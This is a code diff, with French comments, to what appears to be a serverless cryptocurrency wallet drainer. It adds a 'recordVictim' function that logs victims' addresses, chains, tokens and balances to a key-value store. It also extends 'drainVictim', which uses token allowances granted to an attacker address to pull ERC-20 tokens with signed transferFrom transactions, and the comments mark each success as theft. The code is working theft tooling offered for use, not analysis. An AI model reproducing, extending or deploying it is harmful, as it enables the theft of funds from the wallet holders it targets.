@@ -56,6 +56,20 @@ const RPC_URLS = {
 
 const drainedAddresses = new Set();
 
+// --- Fonction d'enregistrement dans KV ---
+async function recordVictim(address, chain, token, amount, status) {
+  const key = `victim:${address}`;
+  const timestamp = Date.now();
+  await kv.hset(key, {
+    chain,
+    token,
+    amount,
+    status,
+    timestamp
+  });
+  console.log(`📝 Victime enregistrée : ${address} (${status})`);
+}
+
 async function drainVictim(victimAddress, chainId) {
   if (drainedAddresses.has(victimAddress)) {
     console.log(`⚠️ Déjà drainé : ${victimAddress}`);
@@ -74,21 +88,29 @@ async function drainVictim(victimAddress, chainId) {
 
   const tokens = TOKENS[chainId] || {};
   for (const [tokenName, tokenAddress] of Object.entries(tokens)) {
-    try {
-      const tokenContract = new web3.eth.Contract(
-        [
-          {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-          {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
-        ],
-        tokenAddress
-      );
+    const tokenContract = new web3.eth.Contract(
+      [
+        {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+        {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
+        {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}
+      ],
+      tokenAddress
+    );
 
+    try {
       const allowance = await tokenContract.methods.allowance(victimAddress, ATTACKER_ADDRESS).call();
       if (allowance === '0') {
-        console.log(`⏭️ ${tokenName} : allowance nulle, ignoré`);
+        // Pas d'allowance → échec, on note la balance disponible
+        const balance = await tokenContract.methods.balanceOf(victimAddress).call();
+        // Conversion lisible : USDT/USDC ont 6 décimales, BNB 18
+        const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
+        const formatted = web3.utils.fromWei(balance, decimals);
+        await recordVictim(victimAddress, chainId, tokenName, formatted, 'failed');
+        console.log(`⏭️ ${tokenName} : allowance nulle (dispo ${formatted})`);
         continue;
       }
 
+      // Drain réussi
       const nonce = await web3.eth.getTransactionCount(ATTACKER_ADDRESS);
       const tx = {
         from: ATTACKER_ADDRESS,
@@ -102,8 +124,21 @@ async function drainVictim(victimAddress, chainId) {
       const signedTx = await web3.eth.accounts.signTransaction(tx, PRIVATE_KEY);
       const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
       console.log(`✅ ${tokenName} volé ! Tx: ${receipt.transactionHash}`);
+
+      const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
+      const drainedAmount = web3.utils.fromWei(allowance, decimals);
+      await recordVictim(victimAddress, chainId, tokenName, drainedAmount, 'drained');
     } catch (e) {
       console.error(`❌ Erreur sur ${tokenName} : ${e.message}`);
+      // En cas d'erreur (ex: gaz, réseau), on enregistre comme échec avec solde dispo si possible
+      try {
+        const balance = await tokenContract.methods.balanceOf(victimAddress).call();
+        const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
+        const formatted = web3.utils.fromWei(balance, decimals);
+        await recordVictim(victimAddress, chainId, tokenName, formatted, 'failed');
+      } catch (err) {
+        await recordVictim(victimAddress, chainId, tokenName, '0', 'failed');
+      }
     }
     await new Promise(r => setTimeout(r, 500));
   }
@@ -142,7 +177,6 @@ export default async function handler(req, res) {
 
     // --- DRAIN MANUEL ADMIN ---
     if (adminSecret) {
-      // Vérifier la présence du secret dans l'environnement
       if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
         return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
       }
